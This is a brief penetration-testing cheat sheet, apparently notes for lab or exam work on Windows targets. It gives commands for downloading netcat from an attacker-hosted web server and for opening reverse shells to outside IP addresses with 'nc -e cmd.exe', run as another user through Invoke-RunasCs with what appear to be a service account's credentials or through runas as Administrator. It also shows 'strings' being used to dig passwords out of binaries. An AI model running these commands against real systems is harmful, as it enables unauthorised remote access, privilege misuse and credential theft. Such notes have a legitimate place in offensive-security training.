# Other

## File transfers

### Upload file to target (Windows)
- Setup webserver: `python3 -m http.server 80`
- Download file on target: `iwr -uri http://192.168.45.198/nc.exe -o nc.exe`

## Run commands as other user from reverse shell (Windows)

### From Windows Reverse Shell
- Download RunasCs: https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
- `import-module .\Invoke-RunasCs.ps1`
- `Invoke-RunasCs svc_mssql trustno1 "C:\Users\Public\nc.exe 192.168.118.23 445 -e cmd.exe"`

### From Windows SSH shell
- `runas /user:Administrator "nc.exe 192.168.45.157 -e cmd.exe"`

## Finding passwords in binary files
- Windows: `strings -e l ResetPassword.exe`
- Linux: `strings resetpassword.elf`
